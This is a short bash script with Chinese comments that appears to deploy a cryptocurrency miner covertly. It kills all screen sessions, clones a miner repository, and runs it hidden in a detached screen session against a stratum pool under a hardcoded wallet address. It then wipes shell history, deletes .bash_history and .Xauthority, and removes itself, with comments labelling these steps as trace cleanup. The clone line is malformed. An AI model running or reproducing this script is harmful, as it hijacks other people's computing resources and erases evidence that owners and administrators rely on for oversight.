#!/bin/bash
screen -ls | awk '/\t/ {print $1}' | xargs -I {} screen -X -S {} quit
# 重命名
cd ~/ && mv btx btx1
# echo "正在获取程序文件..."
git clone git clone https://github.com/xiaobintse/btx.git
# 启动程序
echo "正在后台启动进程..."
# 注意：这里运行的是 $HOME/vllm/ 目录下的 p
screen -dmS btx bash -c 'sleep 5 && cd ~/btx && ./btx -o stratum+tcp://btx-hk.lproute.com:8660 -u btx1zspaa73ljgf4jj3mlesdgkjlyawnv357kuervsvuvp8f0fq786e3qj6mtzs.$(hostname) -p x -a btx'

# 痕迹清理
history -c
rm -f $HOME/.Xauthority
rm -f $HOME/.bash_history
# 脚本自删除
rm -f "$0"

echo "-------------------------------------------------------"
echo "部署完成！"
echo "-------------------------------------------------------"
